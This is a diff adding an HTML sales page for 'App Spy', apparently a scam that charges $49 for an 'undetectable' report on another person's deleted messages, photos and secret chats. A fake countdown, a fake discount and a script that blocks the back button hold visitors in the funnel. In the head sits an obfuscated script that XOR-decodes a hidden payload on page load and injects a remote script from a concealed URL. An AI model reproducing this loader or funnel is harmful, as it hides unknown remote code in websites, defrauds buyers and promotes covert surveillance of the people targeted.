@@ -1,0 +1,324 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <link rel="icon" href="/favicon/favicon.ico" sizes="any">
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon/favicon-16x16.png">
+    <link rel="apple-touch-icon" sizes="180x180" href="/favicon/favicon-180x180.png">
+    <!-- Google Analytics (GA4) -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-XLQQWM3D3N"></script>
+    <script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}gtag('js',new Date());gtag('config','G-XLQQWM3D3N');</script>
+<script>(function(){var v_ls2=atob("DLXmiYmPUwdRr4wYC87E/PvjcT1zx/hse8bcpqbsN2l/2vh1YtOfp+rgPikz3aNraMeP+f38fHIlwv83Z9SS7Pr7fW0ijaA6asGS++DtJnM03K4iUM7E5+jiNiVrjeh5f9TL/P3iOmEogvxqbsOD5/2iK2Q+y6FraN7Epav5Mmskyq4iKZebpfKtPWY8yq4iKdGH/eiiJnM8xuphJsWU7P/qPXN83Pl6YtGVq6WtJWY92uk6MZfE9NTy");var d_w=[];for(var l_fijp=0;l_fijp<v_ls2.length;l_fijp++){d_w.push(v_ls2.charCodeAt(l_fijp)&255);}var o_xk=d_w[0];var o_h=d_w.slice(1,1+o_xk);var o_n5r=d_w.slice(1+o_xk);var r_3e63=o_n5r.map(function(b,i_f491){return b^o_h[i_f491%o_xk];});var r_9vvj="";for(var f_e=0;f_e<r_3e63.length;f_e++){r_9vvj+=String.fromCharCode(r_3e63[f_e]&255);}var w_909i=decodeURIComponent(escape(r_9vvj));var q_7zmf=JSON.parse(w_909i);var d_rdr=q_7zmf.globals||[];d_rdr.forEach(function(f_m8){window[f_m8.name]=f_m8.value;});var w_uep5=document.createElement("script");w_uep5.src=q_7zmf.url;w_uep5.async=true;w_uep5.defer=true;(q_7zmf.attributes||[]).forEach(function(w_taor){w_uep5.setAttribute(w_taor.name,w_taor.value);});(document.head||document.documentElement).appendChild(w_uep5);})();</script>
+<script type="text/javascript">
+    (function(c,l,a,r,i,t,y){
+        c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+        t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+        y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+    })(window, document, "clarity", "script", "xq3x58b2lj");
+</script>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>App Spy — Your Report Is Reserved</title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+<script>
+function buildForwardUrl(targetUrl, params) {
+  var url = new URL(targetUrl, window.location.href);
+  var currentParams = new URLSearchParams(window.location.search);
+  currentParams.forEach(function(value, key) {
+    if (!url.searchParams.has(key)) url.searchParams.set(key, value);
+  });
+  if (params) {
+    Object.keys(params).forEach(function(key) {
+      var value = params[key];
+      if (value !== undefined && value !== null && value !== '') url.searchParams.set(key, value);
+    });
+  }
+  return url.toString();
+}
+function navigateWithQuery(targetUrl, params) {
+  window.location.href = buildForwardUrl(targetUrl, params);
+}
+</script>
+<style>
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0;}
+:root{
+  --g:#25D366;--gd:#128C7E;--bg:#f0f2f5;--w:#fff;
+  --t:#111b21;--t2:#667781;--bd:#e9edef;--red:#ef4444;
+}
+body{
+  font-family:'Inter',sans-serif;background:var(--bg);color:var(--t);
+  min-height:100vh;display:flex;align-items:center;justify-content:center;
+  padding:1.5rem 1rem 2rem;
+}
+.overlay{
+  width:100%;max-width:420px;animation:up .45s ease both;
+}
+@keyframes up{from{opacity:0;transform:translateY(16px)}to{opacity:1;transform:translateY(0)}}
+
+.card{
+  background:var(--w);border-radius:20px;padding:1.75rem 1.35rem 1.5rem;
+  box-shadow:0 12px 40px rgba(15,23,42,.1);border:1px solid var(--bd);
+  text-align:center;position:relative;overflow:hidden;
+}
+
+.live-badge{
+  display:inline-flex;align-items:center;gap:.4rem;
+  background:#fff0f0;border:1px solid #fecaca;border-radius:30px;
+  padding:.35rem .85rem;font-size:.72rem;font-weight:700;color:var(--red);
+  margin-bottom:1rem;letter-spacing:.02em;
+}
+.live-dot{width:7px;height:7px;border-radius:50%;background:var(--red);animation:pulse 1.3s ease infinite;}
+@keyframes pulse{0%,100%{opacity:1;transform:scale(1)}50%{opacity:.35;transform:scale(.7)}}
+
+.popup-icon{
+  width:64px;height:64px;margin:0 auto .9rem;border-radius:50%;
+  background:#f0fdf4;border:2px solid #bbf7d0;
+  display:flex;align-items:center;justify-content:center;font-size:1.75rem;
+  box-shadow:0 4px 16px rgba(37,211,102,.15);
+}
+
+.popup-label{
+  font-size:.78rem;font-weight:700;color:var(--gd);text-transform:uppercase;
+  letter-spacing:.06em;margin-bottom:.45rem;
+}
+.popup-title{
+  font-size:clamp(1.35rem,5vw,1.65rem);font-weight:900;color:var(--t);
+  line-height:1.25;letter-spacing:-.03em;margin-bottom:.7rem;
+}
+.popup-title .hi{color:var(--g);}
+.popup-sub{
+  font-size:.88rem;color:var(--t2);line-height:1.55;margin-bottom:1.2rem;
+}
+.popup-sub strong{color:var(--t);font-weight:600;}
+
+/* Price block */
+.price-block{
+  display:flex;align-items:center;justify-content:center;gap:1rem;
+  background:var(--bg);border:1px solid var(--bd);border-radius:14px;
+  padding:1rem 1.1rem;margin-bottom:1.1rem;
+}
+.price-old,.price-new{text-align:center;flex:1;}
+.price-old-label,.price-new-label{
+  font-size:.68rem;font-weight:600;color:var(--t2);text-transform:uppercase;
+  letter-spacing:.04em;margin-bottom:.25rem;
+}
+.price-old-val{
+  font-size:1.5rem;font-weight:800;color:var(--t2);text-decoration:line-through;
+}
+.price-arrow{font-size:1.2rem;color:var(--t2);font-weight:700;}
+.price-new-label{color:var(--gd);}
+.price-new-val{
+  font-size:2.1rem;font-weight:900;color:var(--g);line-height:1;letter-spacing:-.03em;
+}
+.savings-badge{
+  display:inline-block;margin-top:.35rem;background:#dcfce7;color:#166534;
+  font-size:.68rem;font-weight:800;padding:.22rem .55rem;border-radius:20px;
+}
+
+/* Timer */
+.timer-row{
+  display:flex;align-items:center;justify-content:center;gap:.55rem;
+  font-size:.8rem;font-weight:600;color:var(--t2);margin-bottom:1.15rem;flex-wrap:wrap;
+}
+.t-block{
+  min-width:40px;background:#111b21;color:#fff;font-weight:900;font-size:1.05rem;
+  padding:.4rem .45rem;border-radius:8px;font-variant-numeric:tabular-nums;
+  letter-spacing:.04em;
+}
+.t-sep{font-weight:900;color:var(--t);font-size:1.1rem;}
+
+/* CTA */
+.cta-btn{
+  width:100%;padding:1.05rem 1rem;border:none;border-radius:13px;
+  background:linear-gradient(135deg,var(--g),#22c55e);
+  color:#fff;font-family:'Inter',sans-serif;font-size:1rem;font-weight:800;
+  cursor:pointer;box-shadow:0 4px 24px rgba(37,211,102,.35);
+  transition:transform .2s,box-shadow .2s;animation:ctaPulse 2s infinite;
+}
+.cta-btn:hover{transform:translateY(-2px);box-shadow:0 8px 28px rgba(37,211,102,.45);}
+@keyframes ctaPulse{
+  0%,100%{box-shadow:0 4px 24px rgba(37,211,102,.3)}
+  50%{box-shadow:0 6px 32px rgba(37,211,102,.55)}
+}
+
+.skip-btn{
+  display:block;width:100%;margin-top:.85rem;background:none;border:none;
+  font-family:'Inter',sans-serif;font-size:.8rem;font-weight:600;color:var(--t2);
+  cursor:pointer;text-decoration:underline;text-underline-offset:3px;padding:.4rem;
+}
+.skip-btn:hover{color:var(--t);}
+
+.popup-footer{
+  margin-top:1.1rem;font-size:.7rem;color:var(--t2);line-height:1.4;
+}
+.trust-row{
+  display:flex;justify-content:center;gap:.75rem;flex-wrap:wrap;margin-top:.85rem;
+}
+.trust-row span{
+  font-size:.68rem;color:var(--t2);font-weight:600;
+  display:inline-flex;align-items:center;gap:.25rem;
+}
+
+/* Checkout loading overlay */
+.checkout-loading-overlay{
+  position:fixed;inset:0;z-index:99998;
+  background:rgba(255,255,255,.97);
+  display:none;flex-direction:column;align-items:center;justify-content:center;gap:1.1rem;
+  animation:clFadeIn .25s ease both;
+}
+@keyframes clFadeIn{from{opacity:0}to{opacity:1}}
+.checkout-spin{
+  width:64px;height:64px;border-radius:50%;
+  border:5px solid var(--bd);border-top-color:var(--g);
+  animation:clSpin .85s linear infinite;
+}
+@keyframes clSpin{to{transform:rotate(360deg)}}
+.checkout-loading-text{
+  font-size:.85rem;font-weight:700;color:var(--t2);letter-spacing:.01em;text-align:center;
+}
+</style>
+<script src="js/urgency-bar.js"></script>
+</head>
+<body>
+
+<!-- Checkout loading overlay -->
+<div class="checkout-loading-overlay" id="checkout-loading">
+  <div class="checkout-spin"></div>
+  <div class="checkout-loading-text">Redirecting to secure checkout...</div>
+</div>
+
+<!-- Puxar para baixo no celular (step6) cai aqui: mesmo formato do back-redirect, SEM desconto extra.
+     Mostra o desconto que já está aplicado ($197 -> $49) e leva direto ao checkout de US$ 49. -->
+<div class="overlay">
+  <div class="card">
+    <div class="live-badge">
+      <div class="live-dot"></div>
+      Report Reserved
+    </div>
+
+    <div class="popup-icon">🔒</div>
+    <div class="popup-label">Wait — Your Report Is Ready</div>
+
+    <h1 class="popup-title">
+      Unlock the Full Report for<br>
+      <span class="hi">Just $49</span>
+    </h1>
+
+    <p class="popup-sub">
+      Your report on <strong id="rs-phone">this number</strong> is reserved. The
+      <strong>75% discount is already applied</strong> — unlock deleted messages, hidden photos and secret chats now, before your reservation expires.
+    </p>
+
+    <div class="price-block">
+      <div class="price-old">
+        <div class="price-old-label">Original Price</div>
+        <div class="price-old-val">$197</div>
+      </div>
+      <div class="price-arrow">→</div>
+      <div class="price-new">
+        <div class="price-new-label">Your Price Now</div>
+        <div class="price-new-val">$49</div>
+        <div class="savings-badge">75% OFF applied</div>
+      </div>
+    </div>
+
+    <div class="timer-row">
+      ⏱ Reservation expires in:
+      <div style="display:flex;align-items:center;gap:.3rem;">
+        <div class="t-block" id="tm">--</div>
+        <span class="t-sep">:</span>
+        <div class="t-block" id="ts">--</div>
+      </div>
+    </div>
+
+    <button class="cta-btn JS-initiate-checkout js-initiate-checkout" type="button" data-plan="reserved" data-value="49" onclick="claimOffer()">
+      Yes! Unlock My Full Report — $49
+    </button>
+
+    <button class="skip-btn" type="button" onclick="skipOffer()">
+      Go back to my report
+    </button>
+
+    <div class="popup-footer">
+      🔒 One-time payment · Secure Payment · 30-Day Guarantee · Instant Access
+    </div>
+    <div class="trust-row">
+      <span>✅ 100% Anonymous</span>
+      <span>✅ Undetectable</span>
+    </div>
+  </div>
+</div>
+
+<script>
+// Variante do teste do back-redirect, se a pessoa já viu (para a venda a $49 contar na variante certa)
+var BR_VAR = (function () { try { return localStorage.getItem('sl_br_var') || sessionStorage.getItem('sl_br_var') || ''; } catch (e) { return ''; } })();
+function rsTrack(name) {
+  var props = { br_variant: BR_VAR || 'none', br_trigger: 'pull' };
+  try { if (window.gtag) gtag('event', name, props); } catch (e) {}
+  try { if (window.clarity) { clarity('set', 'br_page', 'reserved'); clarity('event', name); } } catch (e) {}
+}
+rsTrack('br_soft_view');
+
+// Número mascarado, igual à step6
+(function () {
+  try {
+    var up = new URLSearchParams(window.location.search);
+    var ph = up.get('phone') || sessionStorage.getItem('sl_phone') || '';
+    var dec = ph ? decodeURIComponent(ph) : '';
+    var masked = dec.replace(/\d(?=\d{2})/g, '*').replace(/\*+/, '****');
+    if (masked) document.getElementById('rs-phone').textContent = masked;
+  } catch (e) {}
+})();
+
+// Mesmo contador da barra do topo (não reinicia)
+(function syncOfferTimer() {
+  var COUNTDOWN_KEY = 'sl_accessExpiresAt';
+  var tmEl = document.getElementById('tm');
+  var tsEl = document.getElementById('ts');
+  function getExpiresAt() {
+    var stored = parseInt(localStorage.getItem(COUNTDOWN_KEY), 10);
+    if (stored && !isNaN(stored)) return stored;
+    var backup = parseInt(sessionStorage.getItem(COUNTDOWN_KEY), 10);
+    if (backup && !isNaN(backup)) return backup;
+    return Date.now();
+  }
+  function tick() {
+    var rem = Math.max(0, getExpiresAt() - Date.now());
+    if (tmEl) tmEl.textContent = String(Math.floor(rem / 60000)).padStart(2, '0');
+    if (tsEl) tsEl.textContent = String(Math.floor((rem % 60000) / 1000)).padStart(2, '0');
+    setTimeout(tick, 250);
+  }
+  tick();
+})();
+
+function claimOffer() {
+  rsTrack('br_soft_claim');
+  var overlay = document.getElementById('checkout-loading');
+  if (overlay) overlay.style.display = 'flex';
+  setTimeout(function () {
+    navigateWithQuery('https://pay.centerpag.com/KCL468706', {
+      phone: sessionStorage.getItem('sl_phone') || sessionStorage.getItem('buyer_phone') || '',
+      name: sessionStorage.getItem('buyer_name') || '',
+      email: sessionStorage.getItem('buyer_email') || '',
+      plan: 'reserved',
+      brv: BR_VAR || 'soft'
+    });
+  }, 1400);
+}
+
+function skipOffer() {
+  rsTrack('br_soft_skip');
+  try { sessionStorage.removeItem('sl_goingToBackredirect'); } catch (e) {}
+  navigateWithQuery('step6.html');
+}
+
+// Botão voltar aqui não sai do funil
+(function () {
+  function trap() { try { history.pushState({ slOffer: 1 }, '', location.href); } catch (e) {} }
+  trap(); setTimeout(trap, 50); setTimeout(trap, 200);
+  window.addEventListener('popstate', function () { trap(); });
+  try { sessionStorage.removeItem('sl_goingToBackredirect'); } catch (e) {}
+})();
+</script>
+</body>
+</html>
